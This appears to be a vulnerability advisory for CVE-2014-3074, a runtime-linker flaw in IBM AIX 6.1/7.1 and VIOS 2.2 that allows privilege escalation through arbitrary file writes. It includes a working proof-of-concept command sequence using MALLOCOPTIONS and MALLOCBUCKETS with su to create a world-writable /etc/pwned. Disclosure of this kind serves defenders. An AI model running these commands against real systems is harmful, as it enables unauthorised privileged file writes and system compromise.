Vulnerability title: Runtime Linker Allows Privilege Escalation Via
Arbitrary File Writes in IBM AIX
CVE: CVE-2014-3074
Vendor: IBM
Product: AIX
Affected version: AIX 6.1 and 7.1 and VIOS 2.2.*
Reported by: Tim Brown

Details:
It has been identified that the runtime linker allows privilege
escalation via arbitrary file writes with elevated privileges (SetGID
and SetUID programs). The following will cause a new file /etc/pwned to
be created with permissions of rw-rw-rw:

umask 0
MALLOCOPTIONS=buckets
MALLOCBUCKETS=number_of_buckets:8,bucket_statistics:/etc/pwned
export MALLOCOPTIONS MALLOCBUCKETS
su -

In instances where the output file exists, then the report_allocations
output will be appended to the existing file and the permissions preserved.
